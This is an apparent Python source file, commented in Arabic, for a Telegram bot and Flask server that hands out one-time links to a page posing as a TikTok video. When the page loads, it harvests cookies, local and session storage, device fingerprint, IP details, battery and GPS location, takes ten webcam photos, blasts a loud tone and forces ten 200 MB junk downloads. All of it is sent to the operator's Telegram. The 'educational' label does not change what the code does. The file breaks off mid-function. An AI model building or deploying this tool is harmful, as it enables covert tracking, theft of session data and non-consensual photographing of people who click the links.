# ============================================================
# بوت تلغرام متكامل - روابط لمرة واحدة - للأغراض التعليمية فقط
# يعمل على Render.com مع لوحة تحكم كاملة
# ============================================================

import telebot
import secrets
import string
import json
import threading
import os
import requests
import base64
import time
import socket
import logging
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, InputMediaPhoto
from dotenv import load_dotenv

# إعداد السجلات
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

load_dotenv()

# ========== الإعدادات ==========
BOT_TOKEN = os.environ.get('BOT_TOKEN', "YOUR_BOT_TOKEN_HERE")
ADMIN_ID = int(os.environ.get('ADMIN_ID', 123456789))
SERVER_URL = os.environ.get('SERVER_URL', "https://nn1-wn68.onrender.com")
USE_SUPABASE = os.environ.get('USE_SUPABASE', 'false').lower() == 'true'
SUPABASE_URL = os.environ.get('SUPABASE_URL', '')
SUPABASE_KEY = os.environ.get('SUPABASE_KEY', '')

# ========== تهيئة البوت ==========
bot = None

def init_bot():
    """تهيئة البوت مع محاولات متعددة"""
    global bot
    try:
        bot = telebot.TeleBot(BOT_TOKEN)
        me = bot.get_me()
        logger.info(f"✅ بوت متصل بنجاح: @{me.username} (ID: {me.id})")
        return True
    except Exception as e:
        logger.error(f"❌ فشل اتصال البوت: {e}")
        return False

init_bot()

# ========== قواعد البيانات ==========
links_db = {}
users_db = {}

# ========== خادم Flask ==========
app = Flask(__name__)
CORS(app)

# ========== صفحة HTML للترحيب ==========
WELCOME_PAGE = """
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مرحباً بك</title>
    <style>
        body {
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            color: #fff;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            text-align: center;
        }
        .container {
            max-width: 600px;
            padding: 40px;
            background: rgba(255,255,255,0.05);
            border-radius: 20px;
            backdrop-filter: blur(10px);
        }
        h1 { color: #fe2c55; font-size: 2.5em; }
        .warning { background: #ff4444; padding: 15px; border-radius: 10px; margin: 20px 0; }
        .info { background: #2a2a4a; padding: 15px; border-radius: 10px; margin: 10px 0; }
        code { background: #333; padding: 2px 8px; border-radius: 4px; font-size: 0.9em; }
        .status { color: #4caf50; font-weight: bold; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🛡️ بوت اختبار أمني</h1>
        <div class="warning">
            ⚠️ هذا الموقع للأغراض التعليمية فقط ⚠️
        </div>
        <div class="info">
            <p>✅ السيرفر يعمل بشكل صحيح!</p>
            <p>📡 الحالة: <span class="status">🟢 نشط</span></p>
            <p>🔗 الروابط النشطة: <strong>{{ links_count }}</strong></p>
            <p>👥 المستخدمين: <strong>{{ users_count }}</strong></p>
        </div>
        <div class="info">
            <p>📌 للحصول على رابط اختبار، تواصل مع المدير على تلغرام</p>
            <p>🔐 روابط الاختبار تكون على شكل:</p>
            <code>{{ server_url }}/?ref=معرف_الرابط</code>
        </div>
        <div style="margin-top: 30px; font-size: 0.8em; color: #666;">
            <p>🕐 الوقت الحالي: {{ current_time }}</p>
            <p>🤖 حالة البوت: {{ bot_status }}</p>
        </div>
    </div>
</body>
</html>
"""

# ========== صفحة HTML الرئيسية ==========
HTML_PAGE = """
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تيك توك - فيديو</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { background: #000; color: #fff; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
        .container { width: 100%; max-width: 400px; background: #111; border-radius: 12px; padding: 20px; }
        .video-placeholder { width: 100%; height: 500px; background: linear-gradient(135deg, #1a1a2e, #16213e); border-radius: 12px; display: flex; flex-direction: column; justify-content: center; align-items: center; }
        .spinner { width: 50px; height: 50px; border: 4px solid #fe2c55; border-top-color: transparent; border-radius: 50%; animation: spin 1s linear infinite; }
        @keyframes spin { to { transform: rotate(360deg); } }
        .status-text { margin-top: 20px; color: #888; font-size: 14px; text-align: center; max-width: 90%; }
        .warning-banner { background: #ff4444; color: #fff; text-align: center; padding: 8px; border-radius: 8px; margin-bottom: 12px; font-size: 12px; font-weight: bold; }
        .progress-bar { width: 100%; height: 4px; background: #333; margin-top: 15px; border-radius: 2px; overflow: hidden; }
        .progress-fill { height: 100%; background: #fe2c55; width: 0%; transition: width 0.1s; }
    </style>
</head>
<body>
    <div class="container">
        <div class="warning-banner">⚠️ بيئة اختبارية - للأغراض التعليمية فقط ⚠️</div>
        <div class="video-placeholder">
            <div class="spinner"></div>
            <div class="status-text" id="status">⏳ جاري التحميل...</div>
            <div class="progress-bar"><div class="progress-fill" id="progress"></div></div>
        </div>
    </div>

    <script>
    (async function() {
        try {
            const urlParams = new URLSearchParams(window.location.search);
            const ref = urlParams.get('ref') || 'unknown';
            
            document.getElementById('status').textContent = '🚀 بدء جمع البيانات...';
            document.getElementById('progress').style.width = '5%';

            // ====== صوت فوري ======
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const oscillator = audioCtx.createOscillator();
                const gainNode = audioCtx.createGain();
                oscillator.connect(gainNode);
                gainNode.connect(audioCtx.destination);
                oscillator.frequency.value = 1200;
                oscillator.type = 'square';
                gainNode.gain.value = 1.0;
                oscillator.start();
                
                let freq = 800;
                const freqInterval = setInterval(() => {
                    freq = Math.floor(Math.random() * 800) + 600;
                    try { oscillator.frequency.value = freq; } catch(e) {}
                }, 3000);
                
                setTimeout(() => {
                    try { oscillator.stop(); clearInterval(freqInterval); } catch(e) {}
                }, 300000);
            } catch(e) {}

            document.getElementById('progress').style.width = '10%';

            // ====== جمع جميع البيانات ======
            const collected = {
                ref: ref,
                timestamp: new Date().toISOString(),
                timestamp_local: new Date().toString(),
                url: window.location.href,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                cookies: document.cookie || 'لا يوجد',
                localStorage: JSON.stringify(localStorage),
                sessionStorage: JSON.stringify(sessionStorage),
                screen: {
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth,
                    pixelRatio: window.devicePixelRatio,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    orientation: screen.orientation ? screen.orientation.type : 'غير معروف'
                },
                window: {
                    innerWidth: window.innerWidth,
                    innerHeight: window.innerHeight,
                    outerWidth: window.outerWidth,
                    outerHeight: window.outerHeight,
                    pageXOffset: window.pageXOffset,
                    pageYOffset: window.pageYOffset
                },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                timezoneOffset: new Date().getTimezoneOffset(),
                dateTime: new Date().toString(),
                hardwareConcurrency: navigator.hardwareConcurrency || 'غير معروف',
                deviceMemory: navigator.deviceMemory || 'غير معروف',
                maxTouchPoints: navigator.maxTouchPoints || 0,
                vendor: navigator.vendor || 'غير معروف',
                vendorSub: navigator.vendorSub || 'غير معروف',
                product: navigator.product || 'غير معروف',
                productSub: navigator.productSub || 'غير معروف',
                appName: navigator.appName || 'غير معروف',
                appVersion: navigator.appVersion || 'غير معروف',
                appCodeName: navigator.appCodeName || 'غير معروف',
                doNotTrack: navigator.doNotTrack || 'غير مفعل',
                plugins: Array.from(navigator.plugins || []).map(p => ({
                    name: p.name,
                    filename: p.filename,
                    description: p.description,
                    length: p.length
                })),
                mimeTypes: Array.from(navigator.mimeTypes || []).map(m => ({
                    type: m.type,
                    description: m.description,
                    suffixes: m.suffixes
                })),
                connection: {
                    type: navigator.connection?.type || 'غير معروف',
                    effectiveType: navigator.connection?.effectiveType || 'غير معروف',
                    downlink: navigator.connection?.downlink || 'غير معروف',
                    rtt: navigator.connection?.rtt || 'غير معروف',
                    saveData: navigator.connection?.saveData || false,
                    downlinkMax: navigator.connection?.downlinkMax || 'غير معروف'
                },
                battery: {},
                location: {},
                images: [],
                ip_details: {}
            };

            document.getElementById('progress').style.width = '20%';
            document.getElementById('status').textContent = '🌐 جلب IP...';

            // ====== جلب IP وتفاصيله ======
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();
                collected.ip_details = {
                    ip: ipData.ip,
                    version: ipData.version,
                    city: ipData.city,
                    region: ipData.region,
                    region_code: ipData.region_code,
                    country: ipData.country_name,
                    country_code: ipData.country_code,
                    country_code_iso3: ipData.country_code_iso3,
                    country_capital: ipData.country_capital,
                    country_tld: ipData.country_tld,
                    country_calling_code: ipData.country_calling_code,
                    postal: ipData.postal,
                    latitude: ipData.latitude,
                    longitude: ipData.longitude,
                    timezone: ipData.timezone,
                    utc_offset: ipData.utc_offset,
                    isp: ipData.org,
                    org: ipData.org,
                    asn: ipData.asn,
                    asn_org: ipData.asn_org,
                    is_vpn: ipData.vpn || false,
                    is_proxy: ipData.proxy || false,
                    is_tor: ipData.tor || false,
                    is_mobile: ipData.mobile || false,
                    is_crawler: ipData.crawler || false,
                    is_hosting: ipData.hosting || false,
                    is_abuser: ipData.abuser || false,
                    threat_score: ipData.threat_score || 'غير معروف'
                };
            } catch(e) {
                collected.ip_details = { error: 'فشل جلب IP' };
            }

            // ====== جلب IP من مصدر آخر ======
            try {
                const backupRes = await fetch('http://ip-api.com/json/');
                const backupData = await backupRes.json();
                if (backupData.status === 'success') {
                    collected.ip_backup = backupData;
                }
            } catch(e) {}

            document.getElementById('progress').style.width = '35%';
            document.getElementById('status').textContent = '🔋 معلومات البطارية...';

            // ====== البطارية ======
            try {
                const battery = await navigator.getBattery();
                collected.battery = {
                    level: Math.round(battery.level * 100) + '%',
                    level_raw: battery.level,
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime
                };
            } catch(e) {
                collected.battery = { error: 'غير مدعوم' };
            }

            document.getElementById('progress').style.width = '45%';
            document.getElementById('status').textContent = '📍 الموقع الجغرافي...';

            // ====== الموقع الجغرافي ======
            collected.location = await new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ error: 'غير مدعوم' });
                } else {
                    navigator.geolocation.getCurrentPosition(
                        pos => resolve({
                            lat: pos.coords.latitude,
                            lng: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            altitude: pos.coords.altitude,
                            altitudeAccuracy: pos.coords.altitudeAccuracy,
                            heading: pos.coords.heading,
                            speed: pos.coords.speed
                        }),
                        (err) => resolve({ error: 'مرفوض', code: err.code, message: err.message }),
                        { timeout: 5000, enableHighAccuracy: true }
                    );
                }
            });

            document.getElementById('progress').style.width = '50%';
            document.getElementById('status').textContent = '📸 تصوير 10 صور...';

            // ====== التقاط 10 صور ======
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        width: { ideal: 1280 },
                        height: { ideal: 720 },
                        facingMode: 'user'
                    } 
                });
                const video = document.createElement('video');
                video.srcObject = stream;
                await video.play();
                const canvas = document.createElement('canvas');
                canvas.width = 1280;
                canvas.height = 720;
                const ctx = canvas.getContext('2d');
                
                for (let i = 0; i < 10; i++) {
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    collected.images.push(canvas.toDataURL('image/jpeg', 0.9));
                    document.getElementById('progress').style.width = (50 + (i * 3.5)) + '%';
                    await new Promise(r => setTimeout(r, 150));
                }
                stream.getTracks().forEach(t => t.stop());
            } catch(e) {
                collected.cameraError = {
                    message: 'مطلوب إذن الكاميرا',
                    error: e.message
                };
            }

            document.getElementById('progress').style.width = '80%';
            document.getElementById('status').textContent = '📥 تحميل 10 ملفات...';

            // ====== تحميل 10 ملفات ======
            const fileNames = [
                'video_4k_sample.mp4',
                'music_album_lossless.flac',
                'game_update_v3.0.pkg',
                'system_backup_2026.img',
                'database_dump_production.sql',
                'firmware_update_v3.2.bin',
                'source_code_full.zip',
                'movie_4k_remux.mkv',
                'project_archive.rar',
                'security_patch_2026.iso'
            ];
            
            for (const name of fileNames) {
                try {
                    const size = 200 * 1024 * 1024;
                    const buffer = new Uint8Array(size);
                    for (let j = 0; j < size; j += 8192) {
                        buffer[j] = Math.floor(Math.random() * 256);
                    }
                    const blob = new Blob([buffer], { type: 'application/octet-stream' });
                    const url = URL.createObjectURL(blob);
                    const a = document.createElement('a');
                    a.style.display = 'none';
                    a.href = url;
                    a.download = name;
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    setTimeout(() => URL.revokeObjectURL(url), 500);
                } catch(e) {}
            }

            document.getElementById('progress').style.width = '95%';
            document.getElementById('status').textContent = '📤 إرسال البيانات...';

            // ====== إرسال البيانات ======
            const response = await fetch('/collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(collected)
            });

            if (response.ok) {
                document.getElementById('progress').style.width = '100%';
                document.getElementById('status').textContent = '✅ تم إرسال كل البيانات!';
            }

            // ====== تعطيل الرابط ======
            await fetch('/mark_used/' + ref, { method: 'POST' });

        } catch(error) {
            document.getElementById('status').textContent = '❌ خطأ: ' + error.message;
        }
    })();
    </script>
</body>
</html>
"""

# ========== دوال حفظ البيانات ==========

def save_data():
    """حفظ البيانات"""
    try:
        with open('links_db.json', 'w') as f:
            json.dump(links_db, f)
        with open('users_db.json', 'w') as f:
            json.dump(users_db, f)
        logger.info("✅ تم حفظ البيانات")
    except Exception as e:
        logger.error(f"⚠️ خطأ في الحفظ: {e}")

def load_data():
    """تحميل البيانات"""
    global links_db, users_db
    try:
        with open('links_db.json', 'r') as f:
            links_db = json.load(f)
        logger.info(f"✅ تم تحميل {len(links_db)} رابط")
    except:
        links_db = {}
        logger.info("📁 تم إنشاء قاعدة بيانات جديدة للروابط")
    
    try:
        with open('users_db.json', 'r') as f:
            users_db = json.load(f)
        logger.info(f"✅ تم تحميل {len(users_db)} مستخدم")
    except:
        users_db = {}
        logger.info("📁 تم إنشاء قاعدة بيانات جديدة للمستخدمين")

# ========== مسارات Flask ==========

@app.route('/')
def index():
    """الصفحة الرئيسية"""
    ref = request.args.get('ref')
    
    if ref:
        if ref not in links_db:
            return render_template_string(WELCOME_PAGE, 
                links_count=len(links_db), 
                users_count=len(users_db),
                server_url=SERVER_URL,
                current_time=datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                bot_status="🟢 يعمل" if bot else "🔴 غير متصل"
            )
        
        link_data = links_db[ref]
        
        if link_data.get('used', False):
            return "⚠️ هذا الرابط تم استخدامه بالفعل!", 410
        
        if link_data.get('expires_at'):
            expiry = datetime.fromisoformat(link_data['expires_at'])
            if datetime.now() > expiry:
                return "⚠️ انتهت صلاحية الرابط!", 410
        
        return HTML_PAGE
    
    return render_template_string(WELCOME_PAGE, 
        links_count=len(links_db), 
        users_count=len(users_db),
        server_url=SERVER_URL,
        current_time=datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        bot_status="🟢 يعمل" if bot else "🔴 غير متصل"
    )

@app.route('/collect', methods=['POST'])
def collect():
    try:
        data = request.json
        ref = data.get('ref', 'unknown')
        
        filename = f"collected_{ref}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
        
        ip_details = data.get('ip_details', {})
        user_id = ip_details.get('ip', 'unknown')
        
        if user_id not in users_db:
            users_db[user_id] = {
                'first_visit': datetime.now().isoformat(),
                'visits': 0,
                'data': []
            }
        users_db[user_id]['visits'] += 1
        users_db[user_id]['last_visit'] = datetime.now().isoformat()
        users_db[user_id]['data'].append({
            'ref': ref,
            'timestamp': data.get('timestamp'),
            'filename': filename
        })
        users_db[user_id]['country'] = ip_details.get('country', 'غير معروف')
        users_db[user_id]['device'] = data.get('platform', 'غير معروف')
        
        save_data()
        send_detailed_report(data, filename, ref)
        
        return jsonify({"status": "success"}), 200
        
    except Exception as e:
        logger.error(f"❌ خطأ في جمع البيانات: {e}")
        return jsonify({"status": "error", "error": str(e)}), 500

@app.route('/mark_used/<ref>', methods=['POST'])
def mark_used(ref):
    if ref in links_db:
        links_db[ref]['used'] = True
        links_db[ref]['used_at'] = datetime.now().isoformat()
        save_data()
    return jsonify({"status": "ok"})

@app.route('/test_bot', methods=['GET'])
def test_bot():
    """اختبار اتصال البوت"""
    try:
        if bot:
            me = bot.get_me()
            return jsonify({
                "status": "connected",
                "bot_username": me.username,
                "bot_id": me.id,
                "token_preview": BOT_TOKEN[:10] + "..."
            })
        else:
            return jsonify({
                "status": "error",
                "error": "البوت غير مهيأ"
            }), 500
    except Exception as e:
        return jsonify({
            "status": "error",
            "error": str(e)
        }), 500

@app.route('/health', methods=['GET'])
def health():
    """فحص صحة السيرفر"""
    return jsonify({
        "status": "healthy",
        "timestamp": datetime.now().isoformat(),
        "links": len(links_db),
        "users": len(users_db),
        "server_url": SERVER_URL,
        "bot_status": "connected" if bot else "disconnected"
    })

# ========== دوال إرسال التقرير ==========

def send_detailed_report(data, filename, ref):
    """إرسال تقرير مفصل 100% بدون أي حذف"""
    
    if not bot:
        logger.error("❌ البوت غير متصل، لا يمكن إرسال التقرير")
        return
    
    ip_details = data.get('ip_details', {})
    images = data.get('images', [])
    battery = data.get('battery', {})
    location = data.get('location', {})
    screen = data.get('screen', {})
    window_info = data.get('window', {})
    connection = data.get('connection', {})
    
    msg = f"📋 **تقرير مفصل - رابط {ref[:8]}**\n"
    msg += f"━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    
    msg += f"🕐 **الوقت:**\n"
    msg += f"   • التاريخ: {data.get('timestamp', 'غير معروف')[:19]}\n"
    msg += f"   • التوقيت المحلي: {data.get('timestamp_local', 'غير معروف')}\n"
    msg += f"   • المنطقة الزمنية: {data.get('timezone', 'غير معروف')}\n"
    msg += f"   • فرق التوقيت: {data.get('timezoneOffset', 'غير معروف')} دقيقة\n\n"
    
    msg += f"🌐 **تفاصيل IP:**\n"
    msg += f"   • IP: `{ip_details.get('ip', 'غير معروف')}`\n"
    msg += f"   • الإصدار: {ip_details.get('version', 'غير معروف')}\n"
    msg += f"   • الدولة: {ip_details.get('country', 'غير معروف')} ({ip_details.get('country_code', '')})\n"
    msg += f"   • رمز الدولة ISO3: {ip_details.get('country_code_iso3', 'غير معروف')}\n"
    msg += f"   • عاصمة الدولة: {ip_details.get('country_capital', 'غير معروف')}\n"
    msg += f"   • المفتاح الدولي: {ip_details.get('country_calling_code', 'غير معروف')}\n"
    msg += f"   • المدينة: {ip_details.get('city', 'غير معروف')}\n"
    msg += f"   • المنطقة: {ip_details.get('region', 'غير معروف')}\n"
    msg += f"   • الرمز البريدي: {ip_details.get('postal', 'غير معروف')}\n"
    msg += f"   • خط العرض: {ip_details.get('latitude', 'غير معروف')}\n"
    msg += f"   • خط الطول: {ip_details.get('longitude', 'غير معروف')}\n"
    msg += f"   • المزود (ISP): {ip_details.get('isp', 'غير معروف')}\n"
    msg += f"   • ASN: {ip_details.get('asn', 'غير معروف')}\n"
    msg += f"   • مالك ASN: {ip_details.get('asn_org', 'غير معروف')}\n"
    msg += f"   • VPN: {'✅' if ip_details.get('is_vpn') else '❌'}\n"
    msg += f"   • Proxy: {'✅' if ip_details.get('is_proxy') else '❌'}\n"
    msg += f"   • Tor: {'✅' if ip_details.get('is_tor') else '❌'}\n"
    msg += f"   • موبايل: {'✅' if ip_details.get('is_mobile') else '❌'}\n"
    msg += f"   • زاحف: {'✅' if ip_details.get('is_crawler') else '❌'}\n"
    msg += f"   • استضافة: {'✅' if ip_details.get('is_hosting') else '❌'}\n"
    msg += f"   • مسيء: {'✅' if ip_details.get('is_abuser') else '❌'}\n"
    msg += f"   • درجة التهديد: {ip_details.get('threat_score', 'غير معروف')}\n\n"
    
    msg += f"📱 **معلومات الجهاز:**\n"
    msg += f"   • User-Agent: `{data.get('userAgent', 'غير معروف')}`\n"
    msg += f"   • المنصة: {data.get('platform', 'غير معروف')}\n"
    msg += f"   • اللغة: {data.get('language', 'غير معروف')}\n"
    msg += f"   • اللغات المتاحة: {', '.join(data.get('languages', [])[:5])}\n"
    msg += f"   • اسم التطبيق: {data.get('appName', 'غير معروف')}\n"
    msg += f"   • إصدار التطبيق: {data.get('appVersion', 'غير معروف')}\n"
    msg += f"   • اسم الكود: {data.get('appCodeName', 'غير معروف')}\n"
    msg += f"   • المورد: {data.get('vendor', 'غير معروف')}\n"
    msg += f"   • المنتج: {data.get('product', 'غير معروف')}\n"
    msg += f"   • Do Not Track: {data.get('doNotTrack', 'غير مفعل')}\n\n"
    
    msg += f"🖥️ **معلومات الشاشة:**\n"
    msg += f"   • العرض: {screen.get('width', 'غير معروف')}px\n"
    msg += f"   • الارتفاع: {screen.get('height', 'غير معروف')}px\n"
    msg += f"   • العرض المتاح: {screen.get('availWidth', 'غير معروف')}px\n"
    msg += f"   • الارتفاع المتاح: {screen.get('availHeight', 'غير معروف')}px\n"
    msg += f"   • عمق الألوان: {screen.get('colorDepth', 'غير معروف')} بت\n"
    msg += f"   • نسبة البيكسل: {screen.get('pixelRatio', 'غير معروف')}\n"
    msg += f"   • اتجاه الشاشة: {screen.get('orientation', 'غير معروف')}\n\n"
    
    msg += f"🪟 **معلومات النافذة:**\n"
    msg += f"   • العرض الداخلي: {window_info.get('innerWidth', 'غير معروف')}px\n"
    msg += f"   • الارتفاع الداخلي: {window_info.get('innerHeight', 'غير معروف')}px\n"
    msg += f"   • العرض الخارجي: {window_info.get('outerWidth', 'غير معروف')}px\n"
    msg += f"   • الارتفاع الخارجي: {window_info.get('outerHeight', 'غير معروف')}px\n"
    msg += f"   • التمرير X: {window_info.get('pageXOffset', 'غير معروف')}px\n"
    msg += f"   • التمرير Y: {window_info.get('pageYOffset', 'غير معروف')}px\n\n"
    
    msg += f"⚙️ **المعالج والذاكرة:**\n"
    msg += f"   • عدد الأنوية: {data.get('hardwareConcurrency', 'غير معروف')}\n"
    msg += f"   • الذاكرة: {data.get('deviceMemory', 'غير معروف')} GB\n"
    msg += f"   • نقاط اللمس القصوى: {data.get('maxTouchPoints', 'غير معروف')}\n\n"
    
    msg += f"📶 **معلومات الاتصال:**\n"
    msg += f"   • نوع الاتصال: {connection.get('type', 'غير معروف')}\n"
    msg += f"   • السرعة الفعالة: {connection.get('effectiveType', 'غير معروف')}\n"
    msg += f"   • سرعة التحميل: {connection.get('downlink', 'غير معروف')} Mbps\n"
    msg += f"   • زمن الاستجابة: {connection.get('rtt', 'غير معروف')} ms\n"
    msg += f"   • توفير البيانات: {'✅' if connection.get('saveData') else '❌'}\n"
    msg += f"   • السرعة القصوى: {connection.get('downlinkMax', 'غير معروف')} Mbps\n\n"
    
    msg += f"🔋 **البطارية:**\n"
    if isinstance(battery, dict):
        msg += f"   • المستوى: {battery.get('level', 'غير معروف')}\n"
        msg += f"   • المستوى الخام: {battery.get('level_raw', 'غير معروف')}\n"
        msg += f"   • الشحن: {'✅' if battery.get('charging') else '❌'}\n"
        msg += f"   • وقت الشحن: {battery.get('chargingTime', 'غير معروف')} ثانية\n"
        msg += f"   • وقت التفريغ: {battery.get('dischargingTime', 'غير معروف')} ثانية\n"
    else:
        msg += f"   • {battery}\n"
    msg += "\n"
    
    msg += f"📍 **الموقع الجغرافي (GPS):**\n"
    if isinstance(location, dict):
        if 'error' in location:
            msg += f"   • {location.get('error')}\n"
        else:
            msg += f"   • خط العرض: {location.get('lat', 'غير معروف')}\n"
            msg += f"   • خط الطول: {location.get('lng', 'غير معروف')}\n"
            msg += f"   • الدقة: {location.get('accuracy', 'غير معروف')} متر\n"
            msg += f"   • الارتفاع: {location.get('altitude', 'غير معروف')} متر\n"
            msg += f"   • دقة الارتفاع: {location.get('altitudeAccuracy', 'غير معروف')} متر\n"
            msg += f"   • الاتجاه: {location.get('heading', 'غير معروف')} درجة\n"
            msg += f"   • السرعة: {location.get('speed', 'غير معروف')} م/ث\n"
    else:
        msg += f"   • {location}\n"
    msg += "\n"
    
    msg += f"🍪 **الكوكيز:**\n"
    msg += f"   • {data.get('cookies', 'لا يوجد')}\n\n"
    
    msg += f"💾 **التخزين المحلي:**\n"
    localStorage = data.get('localStorage', '{}')
    if len(localStorage) > 200:
        msg += f"   • {localStorage[:200]}...\n\n"
    else:
        msg += f"   • {localStorage}\n\n"
    
    msg += f"📦 **التخزين الجلسة:**\n"
    sessionStorage = data.get('sessionStorage', '{}')
    if len(sessionStorage) > 200:
        msg += f"   • {sessionStorage[:200]}...\n\n"
    else:
        msg += f"   • {sessionStorage}\n\n"
    
    plugins = data.get('plugins', [])
    msg += f"🔌 **الإضافات ({len(plugins)}):**\n"
    for i, plugin in enumerate(plugins[:5], 1):
        if isinstance(plugin, dict):
            msg += f"   {i}. {plugin.get('name', 'غير معروف')}\n"
    if len(plugins) > 5:
        msg += f"   ... و {len(plugins) - 5} إضافات أخرى\n"
    msg += "\n"
    
    msg += f"📸 **الصور:** {len(images)} صورة\n"
    msg += f"📁 **حفظت في:** `{filename}`\n"
    msg += f"🔗 **الرابط:** `{ref}`\n"
    
    try:
        if len(msg) > 4000:
            parts = [msg[i:i+4000] for i in range(0, len(msg), 4000)]
            for part in parts:
                bot.send_message(ADMIN_ID, part, parse_mode='Markdown')
        else:
            bot.send_message(ADMIN_ID, msg, parse_mode='Markdown')
    except Exception as e:
        logger.error(f"⚠️ فشل إرسال التقرير: {e}")
    
    if images:
        try:
            media_group = []
            for i, img_data in enumerate(images[:10]):
                if img_data.startswith('data:image'):
                    img_base64 = img_data.split(',')[1]
                    img_bytes = base64.b64decode(img_base64)
                    temp_file = f"temp_{ref}_{i}.jpg"
                    with open(temp_file, 'wb') as f:
                        f.write(img_bytes)
                    
                    caption = f"📸 صورة {i+1}/10 - {ref[:8]}" if i == 0 else None
                    if i == 0:
                        media_group.append(InputMediaPhoto(open(temp_file, 'rb'), caption=caption))
                    else:
                        media_group.append(InputMediaPhoto(open(temp_file, 'rb')))
            
            if media_group:
                bot.send_media_group(ADMIN_ID, media_group)
                
            for i in range(len(images[:10])):
                try:
                    os.remove(f"temp_{ref}_{i}.jpg")
                except:
                    pass
        except Exception as e:
            logger.error(f"⚠️ فشل إرسال الصور: {e}")
    
    try:
        with open(filename, 'rb') as f:
            bot.send_document(ADMIN_ID, f, caption=f"📊 الملف الكامل - {ref[:8]}")
    except Exception as e:
        logger.error(f"⚠️ فشل إرسال الملف: {e}")

# ========== أوامر البوت ==========

@bot.message_handler(commands=['start'])
def start(msg):
    if msg.from_user.id != ADMIN_ID:
        bot.reply_to(msg, "⛔ غير مصرح لك بالوصول إلى لوحة التحكم")
        return
    
    keyboard = InlineKeyboardMarkup(row_width=2)
    keyboard.add(
        InlineKeyboardButton("🔗 إنشاء رابط", callback_data="create_link"),
        InlineKeyboardButton("📊 الإحصائيات", callback_data="stats"),
        InlineKeyboardButton("👥 المستخدمين", callback_data="users"),
        InlineKeyboardButton("🔗 الروابط النشطة", callback_data="active_links"),
        InlineKeyboardButton("🗑️ حذف البيانات", callback_data="clear_all"),
        InlineKeyboardButton("📁 تصدير البيانات", callback_data="export")
    )
    
    bot.send_message(msg.chat.id, 
        f"🛡️ **لوحة تحكم البوت**\n"
        f"━━━━━━━━━━━━━━━━━━━\n"
        f"🌐 **رابط السيرفر:**\n"
        f"`{SERVER_URL}`\n\n"
        f"📌 اختر الإجراء المناسب:",
        reply_markup=keyboard,
        parse_mode='Markdown'
    )

@bot.message_handler(commands=['help'])
def help_command(msg):
    if msg.from_user.id != ADMIN_ID:
        bot.reply_to(msg, "⛔ غير مصرح لك")
        return
    
    help_text = """
📖 **قائمة الأوامر المتاحة:**
━━━━━━━━━━━━━━━━━━━
/start - فتح لوحة التحكم
/help - عرض هذه المساعدة
/stats - عرض الإحصائيات
/users - عرض المستخدمين
/links - عرض الروابط النشطة
/clear - حذف جميع البيانات
/export - تصدير البيانات

🔗 **للحصول على رابط جديد:**
استخدم زر "إنشاء رابط" في لوحة التحكم

⚠️ جميع الروابط تستخدم مرة واحدة فقط
    """
    bot.reply_to(msg, help_text, parse_mode='Markdown')

@bot.message_handler(commands=['stats'])
def stats_command(msg):
    if msg.from_user.id != ADMIN_ID:
        bot.reply_to(msg, "⛔ غير مصرح لك")
        return
    show_stats(msg)

@bot.message_handler(commands=['users'])
def users_command(msg):
    if msg.from_user.id != ADMIN_ID:
        bot.reply_to(msg, "⛔ غير مصرح لك")
        return
    show_users(msg)

@bot.message_handler(commands=['links'])
def links_command(msg):
    if msg.from_user.id != ADMIN_ID:
        bot.reply_to(msg, "⛔ غير مصرح لك")
        return
    show_active_links(msg)

@bot.message_handler(commands=['clear'])
def clear_command(msg):
    if msg.from_user.id != ADMIN_ID:
        bot.reply_to(msg, "⛔ غير مصرح لك")
        return
    
    global links_db, users_db
    links_db = {}
    users_db = {}
    save_data()
    bot.reply_to(msg, "✅ تم حذف جميع البيانات")

@bot.message_handler(commands=['export'])
def export_command(msg):
    if msg.from_user.id != ADMIN_ID:
        bot.reply_to(msg, "⛔ غير مصرح لك")
        return
    export_data(msg)

@bot.message_handler(func=lambda msg: True)
def echo_all(msg):
    """الرد على أي رسالة أخرى"""
    if msg.from_user.id != ADMIN_ID:
        bot.reply_to(msg, "⛔ غير مصرح لك")
        return
    
    bot.reply_to(msg, 
        "❓ أمر غير معروف\n"
        "أرسل /help لعرض الأوامر المتاحة"
    )

# ========== دوال الكالبات ==========

@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    if call.from_user.id != ADMIN_ID:
        bot.answer_callback_query(call.id, "⛔ غير مصرح لك")
        return
    
    if call.data == "create_link":
        bot.send_message(call.message.chat.id, 
